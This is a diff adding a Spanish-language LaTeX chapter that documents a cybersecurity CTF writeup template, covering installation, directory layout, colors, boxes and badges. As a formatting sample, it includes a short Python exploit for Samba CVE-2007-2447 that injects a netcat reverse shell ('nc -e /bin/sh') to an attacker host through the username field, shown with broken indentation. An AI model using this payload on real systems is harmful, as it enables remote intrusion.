@@ -1,0 +1,340 @@
+% !TeX document-id = {f25b0f90-aca3-472d-8cfd-01a898f2d74f}
+% !TeX program = pdflatex
+% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
+% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex
+
+\documentclass[../../main_compilation.tex]{subfiles}
+
+\begin{document}
+
+\chapter{Guía de Uso del Template \& Manual Técnico}
+\label{chap:manual_template}
+\setCustomHeader{{\color{csecCyan}\faBookOpen}\ \textbf{Documentación}}{Manual \& Guía del Template}{\today}
+
+Este capítulo proporciona una guía completa y exhaustiva sobre la estructura, los componentes visuales, la paleta de colores, los entornos interactivos y los procedimientos de instalación multiplataforma del \textbf{Template de Ciberseguridad}.
+
+
+\section{Instalación y Configuración del Entorno}
+Para utilizar este repositorio y generar documentos PDF con tipografía vectorial, iconos FontAwesome, gráficos TikZ y resaltado de sintaxis con \textbf{\texttt{minted}} sin errores, sigue las instrucciones de instalación según tu sistema operativo:
+
+\subsection{Clonar el Repositorio}
+Abre tu terminal y clona el repositorio desde GitHub:
+\begin{bashbox}{Clonar Repositorio}
+	git clone https://github.com/errantprogrammer/tex_template.git
+	cd tex_template/cybersecurity
+\end{bashbox}
+
+\subsection{Instalación de Pygments con \texttt{uv} (Requisito para \texttt{minted})}
+El template utiliza el motor \textbf{\texttt{minted}} con \textit{Pygments} para proporcionar resaltado de sintaxis de alta fidelidad. La forma recomendada y más rápida de instalarlo es utilizando \textbf{\texttt{uv}} (el gestor de paquetes ultrarrápido de Python):
+
+\begin{bashbox}{Instalación de Pygments con uv}
+	# 1. Instalar uv en Linux / macOS:
+	curl -LsSf https://astral.sh/uv/install.sh | sh
+
+	# En Windows (PowerShell):
+	powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
+
+	# 2. Instalar Pygments como herramienta global con uv:
+	uv tool install pygments
+
+	# O alternativamente instalarlo via pip con uv:
+	uv pip install --system pygments
+\end{bashbox}
+
+\subsection{Instalación de \LaTeX\ en Linux}
+\begin{description}
+	\item[\textbf{Debian / Ubuntu / Kali Linux / Parrot OS:}]
+	      Instala la distribución completa de TeX Live:
+	      \begin{bashbox}{Debian / Ubuntu / Kali}
+		      sudo apt update
+		      sudo apt install -y texlive-full
+	      \end{bashbox}
+	      \textit{Opción ligera (si cuentas con espacio de disco limitado):}
+	      \begin{bashbox}{Debian / Ubuntu (Instalación Ligera)}
+		      sudo apt install -y texlive-latex-extra texlive-fonts-extra \
+		      texlive-extra-utils texlive-science fonts-font-awesome
+	      \end{bashbox}
+
+	\item[\textbf{Fedora / Red Hat / CentOS:}]
+	      \quad%quad
+	      \begin{bashbox}{Fedora / RHEL}
+		      sudo dnf install -y texlive-scheme-full
+	      \end{bashbox}
+
+	\item[\textbf{Arch Linux / Manjaro:}]
+	      \quad%quad
+	      \begin{bashbox}{Arch Linux / Manjaro}
+		      sudo pacman -S --needed texlive-meta texlive-fontsextra
+	      \end{bashbox}
+\end{description}
+
+\subsection{Instalación de \LaTeX\ en Windows}
+\begin{enumerate}
+	\item Descarga e instala \textbf{MiKTeX} (\url{https://miktex.org/download}) o \textbf{TeX Live para Windows}.
+	\item Durante el asistente de instalación de MiKTeX, marca la opción \textbf{\textit{"Always install missing packages on-the-fly"}} para que cualquier paquete adicional se descargue automáticamente en la primera compilación.
+	\item \textbf{Editor recomendado:} Instala \textbf{Visual Studio Code} con la extensión oficial \textbf{LaTeX Workshop} o utiliza \textbf{TeXstudio}.
+	\item Para compilar desde PowerShell o CMD (con \texttt{-shell-escape}):
+	      \begin{bashbox}{Compilación en Windows (PowerShell)}
+		      cd cybersecurity
+		      pdflatex -shell-escape main_compilation.tex
+	      \end{bashbox}
+\end{enumerate}
+
+\subsection{Instalación de \LaTeX\ en macOS}
+\begin{enumerate}
+	\item Instala la distribución completa \textbf{MacTeX} utilizando Homebrew:
+	      \begin{bashbox}{Homebrew macOS}
+		      brew install --cask mactex
+	      \end{bashbox}
+	      \textit{O descarga el instalador gráfico MacTeX.pkg desde:} \url{https://www.tug.org/mactex/}.
+	\item \textbf{Editor recomendado:} Visual Studio Code (con LaTeX Workshop) o TeXShop (incluido en la instalación de MacTeX).
+	\item Para compilar desde Terminal (con \texttt{-shell-escape}):
+	      \begin{bashbox}{Terminal macOS}
+		      cd cybersecurity
+		      pdflatex -shell-escape main_compilation.tex
+	      \end{bashbox}
+\end{enumerate}
+
+\section{Arquitectura y Flujo de Trabajo}
+El template está diseñado bajo una arquitectura modular y desacoplada mediante el paquete \texttt{subfiles}. Esto permite dos flujos de trabajo simultáneos:
+
+\begin{infobox}[Modos de Compilación Disponibles]
+	\begin{itemize}
+		\item \textbf{Modo Standalone (Writeup Individual):} Puedes compilar un archivo \texttt{writeup.tex} de forma aislada dentro de su propia carpeta mediante \texttt{pdflatex -shell-escape writeup.tex}. El archivo generará su propia portada individual, cabeceras locales y numeración desde \textbf{1.0} (evitando el error de secciones 0.1).
+		\item \textbf{Modo Maestro (\texttt{main\_compilation.tex}):} Compila el libro completo recopilando todos los writeups, generando automáticamente la portada, el \textbf{Dashboard de Progreso interactivo} y la Tabla de Contenidos general.
+	\end{itemize}
+\end{infobox}
+
+\subsection{Estructura de Directorios}
+La jerarquía de carpetas está estandarizada de la siguiente manera:
+
+\begin{codebox}[text]{Árbol de Directorios del Módulo}
+	cybersecurity/
+	|-- main_compilation.tex         # Documento maestro (Libro completo)
+	|-- figure/                      # Imagenes maestras y logos globales
+	|-- style/
+	|   \-- cybersec.sty             # Paquete principal con estilos y macros
+	|-- chapters/
+	|   |-- guide/
+	|   |   \-- template_guide.tex   # Manual de uso (este documento)
+	|   \-- knowledge_base/
+	|       \-- knowledge_base.tex   # Base de conocimiento y bitácora transversal
+	\-- writeups/
+	    |-- hackthebox/
+	    |   \-- lame/
+	    |       |-- writeup.tex      # Writeup individual de HTB Lame
+	    |       \-- figure/          # Capturas exclusivas de la maquina
+	    |-- tryhackme/
+	    \-- ctf/
+	        \-- pico_format_string/
+	            |-- writeup.tex      # Reto individual de CTF
+	            \-- figure/
+\end{codebox}
+
+
+\section{Paleta de Colores Oficial}
+El diseño utiliza una gama cromática moderna basada en tonos pizarra oscuros, cianes de alta visibilidad y el estándar CVSS v3.1 para niveles de severidad:
+
+\begin{table}[h!]
+	\centering
+	\small
+	\begin{tabularx}{\textwidth}{l l c X}
+		\toprule
+		\rowcolor{csecDark}
+		\textbf{\color{white}Nombre de Color} &
+		\textbf{\color{white}Código HEX}      &
+		\textbf{\color{white}Muestra}         &
+		\textbf{\color{white}Uso Recomendado}                                                                                                                                                            \\
+		\midrule
+		\texttt{csecDark}                     & \texttt{\#0F172A} & \fcolorbox{csecDark}{csecDark}{\rule{0pt}{7pt}\rule{18pt}{0pt}}      & Fondos principales oscuros, cabeceras de tablas y texto base. \\
+		\texttt{csecNavy}                     & \texttt{\#1E293B} & \fcolorbox{csecBorder}{csecNavy}{\rule{0pt}{7pt}\rule{18pt}{0pt}}    & Fondos de tarjetas de código, acentos secundarios.            \\
+		\texttt{csecCyan}                     & \texttt{\#0284C7} & \fcolorbox{csecBorder}{csecCyan}{\rule{0pt}{7pt}\rule{18pt}{0pt}}    & Enlaces interactivos, subtítulos destacados y comandos.       \\
+		\texttt{csecGreen}                    & \texttt{\#059669} & \fcolorbox{csecBorder}{csecGreen}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & Estado PWNED / Resuelto, flags y remediaciones válidas.       \\
+		\texttt{csecOrange}                   & \texttt{\#D97706} & \fcolorbox{csecBorder}{csecOrange}{\rule{0pt}{7pt}\rule{18pt}{0pt}}  & Advertencias, notas técnicas y estados pendientes.            \\
+		\texttt{csecRed}                      & \texttt{\#DC2626} & \fcolorbox{csecBorder}{csecRed}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & Alertas críticas y vulnerabilidades graves.                   \\
+		\texttt{csecPurple}                   & \texttt{\#7C3AED} & \fcolorbox{csecBorder}{csecPurple}{\rule{0pt}{7pt}\rule{18pt}{0pt}}  & Reversing, explotación de binarios (Pwn) y pwn.college.       \\
+		\texttt{csecLight}                    & \texttt{\#F8FAFC} & \fcolorbox{csecBorder}{csecLight}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & Fondo de cajas de información y tarjetas claras.              \\
+		\midrule
+		\texttt{sevCritical}                  & \texttt{\#991B1B} & \fcolorbox{csecBorder}{sevCritical}{\rule{0pt}{7pt}\rule{18pt}{0pt}} & CVSS 9.0 -- 10.0 (Vulnerabilidad Crítica / RCE).              \\
+		\texttt{sevHigh}                      & \texttt{\#DC2626} & \fcolorbox{csecBorder}{sevHigh}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & CVSS 7.0 -- 8.9 (Vulnerabilidad Alta / PrivEsc).              \\
+		\texttt{sevMedium}                    & \texttt{\#D97706} & \fcolorbox{csecBorder}{sevMedium}{\rule{0pt}{7pt}\rule{18pt}{0pt}}   & CVSS 4.0 -- 6.9 (Vulnerabilidad Media / XSS, CSRF).           \\
+		\texttt{sevLow}                       & \texttt{\#2563EB} & \fcolorbox{csecBorder}{sevLow}{\rule{0pt}{7pt}\rule{18pt}{0pt}}      & CVSS 0.1 -- 3.9 (Vulnerabilidad Baja / Info Disclosure).      \\
+		\texttt{sevInfo}                      & \texttt{\#059669} & \fcolorbox{csecBorder}{sevInfo}{\rule{0pt}{7pt}\rule{18pt}{0pt}}     & Informativo / Buenas prácticas.                               \\
+		\bottomrule
+	\end{tabularx}
+	\caption{Paleta de colores del template de Ciberseguridad.}
+\end{table}
+
+
+\section{Componentes Visuales y Cajas de Entorno}
+
+\subsection{Ficha Resumen del Objetivo (\texttt{\textbackslash targetSummary})}
+Es el bloque inicial que define la ficha técnica del reto o máquina evaluada. Al utilizar este comando, se realizan 3 acciones automáticas:
+\begin{enumerate}
+	\item Dibuja la tarjeta técnica con soporte para múltiples tags y flags largas.
+	\item Actualiza dinámicamente las cabeceras de página con el logo de la plataforma y el nombre de la máquina.
+	\item Registra automáticamente los datos en el \textbf{Dashboard de Progreso} del documento maestro.
+\end{enumerate}
+
+\begin{codebox}[latex]{Sintaxis de \textbackslash targetSummary}
+	\targetSummary%
+	{Nombre_Objetivo}%    1. Nombre de la maquina o reto
+	{10.10.10.3}%         2. IP o Hostname
+	{HackTheBox}%         3. Plataforma (HackTheBox, TryHackMe, PortSwigger, CTF o ruta)
+	{Easy}%               4. Dificultad (Easy, Medium, Hard, Insane)
+	{Linux}%              5. Sistema Operativo (Linux, Windows, etc.)
+	{Samba, RCE, Tags}%   6. Tags o vectores clave separados por coma
+	{17/08/2026}%         7. Fecha de resolucion
+	{user_flag_hash}%     8. Flag de Usuario o Flag CTF
+	{root_flag_hash}%     9. Flag de Root (dejar vacio {} si solo hay una flag)
+\end{codebox}
+
+\subsection{Terminal de Comandos (\texttt{terminal})}
+Entorno diseñado para mostrar trazas de consola, escaneos Nmap, respuestas de terminal y comandos interactivos:
+
+\begin{codebox}[latex]{Sintaxis del Entorno terminal}
+	\begin{terminal}
+		[attacker@kali:~]$ nmap -sC -sV -p 21,22,139,445 10.10.10.3
+		PORT    STATE SERVICE     VERSION
+		21/tcp  open  ftp         vsftpd 2.3.4
+		139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
+		445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
+	\end{terminal}
+\end{codebox}
+
+\begin{terminal}
+	[attacker@kali:~]$ nmap -sC -sV -p 21,22,139,445 10.10.10.3
+	PORT    STATE SERVICE     VERSION
+	21/tcp  open  ftp         vsftpd 2.3.4
+	139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
+	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
+
+\end{terminal}
+
+\subsection{Cajas de Código y Exploits (\texttt{codebox}, \texttt{pythonbox}, \texttt{bashbox})}
+Permiten incrustar exploits o scripts personalizados con números de línea y resaltado de sintaxis:
+
+\begin{pythonbox}{Exploit Samba CVE-2007-2447}
+	import sys
+	from smb.SMBConnection import SMBConnection
+
+	def trigger_rce(target_ip, lhost, lport):
+	payload = f"nohup nc -e /bin/sh {lhost} {lport} &"
+	username = f"/=`{payload}`"
+	conn = SMBConnection(username, "", "attacker", "target", use_ntlm_v2=False)
+	conn.connect(target_ip, 445, timeout=5)
+
+	if __name__ == "__main__":
+	trigger_rce("10.10.10.3", "10.10.14.5", 4444)
+\end{pythonbox}
+
+\subsection{Cajas de Alerta y Análisis de Vulnerabilidad}
+\begin{vulnbox}{Ejecución Remota de Comandos (CVE-2007-2447)}
+	La versión de Samba 3.0.20 permite la ejecución de comandos arbitrarios en el servidor debido a la falta de sanitización en el parámetro \texttt{username map script} en transacciones MS-RPC.
+\end{vulnbox}
+
+\begin{infobox}[Nota Informativa]
+	Este es un recuadro estándar para notas de reconocimiento o metodologías aplicadas.
+\end{infobox}
+
+\begin{tipbox}[Pro-Tip de Explotación]
+	Siempre verifica si los sockets Unix locales permiten comunicación con procesos de privilegios elevados sin autenticación.
+\end{tipbox}
+
+\begin{warnbox}[Advertencia]
+	El exploit reinicia el servicio en caso de fallo, lo que podría alertar al sistema de detección de intrusos (IDS).
+\end{warnbox}
+
+\begin{alertbox}[Alerta de Severidad Crítica]
+	Acceso total como usuario \texttt{root} conseguido sin requerir credenciales previas.
+\end{alertbox}
+
+\subsection{Caja de Flags Segura (\texttt{flagbox})}
+La caja \texttt{flagbox} admite flags de cualquier longitud y con caracteres especiales (\texttt{\_}, \texttt{\#}, \texttt{\%}, \texttt{\&}, \texttt{\{ \}}) sin necesidad de escaparlos manualmente:
+
+\begin{flagbox}{Flag Capturada picoCTF}
+	picoCTF{format_string_exploit_leak_3847291a_custom_pwn_success}
+\end{flagbox}
+
+\subsection{Cajas de Aprendizaje y Fuentes de Consulta (\texttt{learningbox}, \texttt{sourcebox})}
+Diseñadas para registrar lecciones aprendidas en writeups o en el capítulo de Knowledge Base, junto con los libros, sitios web o cursos consultados:
+
+\begin{learningbox}[Técnica Asimilada: Inyección en Samba]
+	La directiva \texttt{username map script} ejecuta comandos arbitrarios sin sanitización en Samba 3.0.x cuando se envían metacaracteres de shell en el nombre de usuario.
+\end{learningbox}
+
+\begin{sourcebox}[Fuentes y Bibliografía Consultada]
+	\begin{itemize}[leftmargin=*]
+		\resourceItem{Libro}{The Linux Command Line (William Shotts)}{Capítulo 24: Redirección y ejecución en subshell}
+		\resourceItem{Web}{Rapid7 Exploit Database — CVE-2007-2447}{\url{https://www.rapid7.com/db/}}
+	\end{itemize}
+\end{sourcebox}
+
+
+\section{Insignias y Badges Modulares}
+Puedes utilizar badges en cualquier parte de tus reportes mediante las siguientes macros:
+
+\begin{table}[h!]
+	\centering
+	\small
+	\begin{tabularx}{\textwidth}{l l X}
+		\toprule
+		\rowcolor{csecDark}
+		\textbf{\color{white}Macro}   &
+		\textbf{\color{white}Muestra} &
+		\textbf{\color{white}Código \LaTeX}                                                                                                          \\
+		\midrule
+		\textbf{Plataformas}          & \platformBadge{HackTheBox}                            & \texttt{\textbackslash platformBadge\{HackTheBox\}}  \\
+		                              & \platformBadge{TryHackMe}                             & \texttt{\textbackslash platformBadge\{TryHackMe\}}   \\
+		                              & \platformBadge{PortSwigger}                           & \texttt{\textbackslash platformBadge\{PortSwigger\}} \\
+		                              & \platformBadge{pwn.college}                           & \texttt{\textbackslash platformBadge\{pwn.college\}} \\
+		                              & \platformBadge{OverTheWire}                           & \texttt{\textbackslash platformBadge\{OverTheWire\}} \\
+		                              & \platformBadge{Root-Me}                               & \texttt{\textbackslash platformBadge\{Root-Me\}}     \\
+		                              & \platformBadge{CTF}                                   & \texttt{\textbackslash platformBadge\{CTF\}}         \\
+		\midrule
+		\textbf{Fuentes / Medios}     & \sourceBadge{Libro} \quad \sourceBadge{Web}           & \texttt{\textbackslash sourceBadge\{Libro\}}         \\
+		                              & \sourceBadge{Docs} \quad \sourceBadge{Curso}          & \texttt{\textbackslash sourceBadge\{Docs\}}          \\
+		                              & \sourceBadge{Lab} \quad \sourceBadge{Writeup}         & \texttt{\textbackslash sourceBadge\{Lab\}}           \\
+		\midrule
+		\textbf{Dificultad}           & \difficultyBadge{Easy} \quad \difficultyBadge{Medium} & \texttt{\textbackslash difficultyBadge\{Easy\}}      \\
+		                              & \difficultyBadge{Hard} \quad \difficultyBadge{Insane} & \texttt{\textbackslash difficultyBadge\{Hard\}}      \\
+		\midrule
+		\textbf{Severidad CVSS}       & \severityBadge{Critical} \quad \severityBadge{High}   & \texttt{\textbackslash severityBadge\{Critical\}}    \\
+		                              & \severityBadge{Medium} \quad \severityBadge{Low}      & \texttt{\textbackslash severityBadge\{Medium\}}      \\
+		\midrule
+		\textbf{Sistemas}             & \osBadge{Linux} \quad \osBadge{Windows}               & \texttt{\textbackslash osBadge\{Linux\}}             \\
+		\midrule
+		\textbf{Etiquetas}            & \tagList{Web, RCE, PrivEsc}                           & \texttt{\textbackslash tagList\{Web, RCE, PrivEsc\}} \\
+		\bottomrule
+	\end{tabularx}
+	\caption{Colección de macros para insignias modulares.}
+\end{table}
+
+
+\section{Reglas de Modificación: Qué Modificar y Qué No}
+
+\begin{table}[h!]
+	\centering
+	\small
+	\begin{tabularx}{\textwidth}{p{7.5cm} p{7.5cm}}
+		\toprule
+		\cellcolor{csecGreen}\textbf{\color{white}\faCheckCircle\ QUÉ PUEDES MODIFICAR LIBREMENTE}                                                            &
+		\cellcolor{sevCritical}\textbf{\color{white}\faTimesCircle\ QUÉ NO DEBES TOCAR EN EL ESTILO} \tabularnewline
+		\midrule
+		\textbf{1. Contenido de Writeups:} Crea y edita libremente archivos \texttt{writeup.tex} dentro de \texttt{writeups/}.                                &
+		\textbf{1. Flujo de Streams de Targets:} No modifiques \texttt{\textbackslash targetStream} ni \texttt{\textbackslash renderDashboard} en \texttt{cybersec.sty}, ya que romperías la autogeneración del Dashboard. \tabularnewline
+		\midrule
+		\textbf{2. Fichas de Objetivos:} Personaliza todos los parámetros de \texttt{\textbackslash targetSummary} (nombres, IPs, fechas, dificultad, flags). &
+		\textbf{2. Macros Globales de Cabecera:} No elimines los comandos \texttt{\textbackslash gdef} en \texttt{\textbackslash setPlatformHeader}, pues son necesarios para mantener la cabecera entre subarchivos. \tabularnewline
+		\midrule
+		\textbf{3. Capturas e Imágenes:} Coloca tus evidencias gráficas dentro de la carpeta \texttt{figure/} de cada writeup o en la raíz \texttt{figure/}.  &
+		\textbf{3. Numeración Adaptativa:} No alteres la macro \texttt{\textbackslash thesection} que ajusta los índices entre modo standalone y modo compilación maestra. \tabularnewline
+		\midrule
+		\textbf{4. Portada y Autor:} Modifica tu nombre, fecha o colección de badges en el \texttt{titlepage} de \texttt{main\_compilation.tex}.              &
+		\textbf{4. Modos de Listado y Verbatim:} No reemplaces las opciones \texttt{verbatim} de \texttt{flagbox} ni de las cajas de terminal. \tabularnewline
+		\bottomrule
+	\end{tabularx}
+	\caption{Guía de modificación y buenas prácticas del template.}
+\end{table}
+
+\end{document}
